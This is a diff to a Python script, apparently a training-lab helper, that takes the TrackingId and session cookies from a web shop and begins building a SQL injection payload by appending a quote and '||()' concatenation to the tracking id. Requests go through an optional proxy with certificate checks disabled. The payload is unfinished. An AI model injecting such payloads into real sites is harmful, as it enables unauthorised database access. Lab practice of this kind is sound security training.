@@ -1,6 +1,9 @@
 import sys
 import logging
 import urllib3
+import urllib.parse
+
+import requests
 
 import utils
 from shop import Shop
@@ -19,6 +22,19 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def main(args):
     shop = Shop(args.url, args.no_proxy)
+    log.info("Getting tracking id and session token.")
+    if args.no_proxy:
+        resp = requests.get(shop.base_url)
+    else:
+        resp = requests.get(shop.base_url, proxies=utils.PROXIES, verify=False)
+    tracking_id = resp.cookies["TrackingId"]
+    session_token = resp.cookies["session"]
+    log.info(f"TrackingId: {tracking_id}")
+    exploit = (
+        f"{tracking_id}'||()"
+    )    
+        
+        
     hint = shop.get_hint()
     print(hint)
     nulls_list = ["NULL"]
